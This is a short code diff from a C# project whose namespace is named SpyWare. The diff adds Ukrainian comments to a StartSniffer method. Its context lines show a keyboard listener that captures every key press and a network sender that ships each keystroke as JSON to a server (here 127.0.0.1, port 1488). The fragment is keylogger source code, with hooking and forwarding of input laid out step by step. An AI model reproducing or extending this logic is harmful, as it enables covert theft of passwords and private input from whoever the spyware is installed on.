@@ -29,8 +29,11 @@ namespace SpyWare
         }
         public void StartSniffer()
         {
+            //Створюємо єкземпляр класу для перехвату натискань на клавіауту
             KeyboardListener keyboardListener = new KeyboardListener();
+            //Ствоюємо єкземпляр класу для пересилання інформації щодо натискань на сервер
             NetworkSender networkSender = new NetworkSender("127.0.0.1", 1488);
+            //Процессор події натискання, з подальшою пересилкою на сервер у вигляді JSON (для прискорення, можно замінити на ProtoBuf)
             keyboardListener.KeyDown += (a, b) =>
             {
                 KeyBoardInteractionInfo kbii = new KeyBoardInteractionInfo();
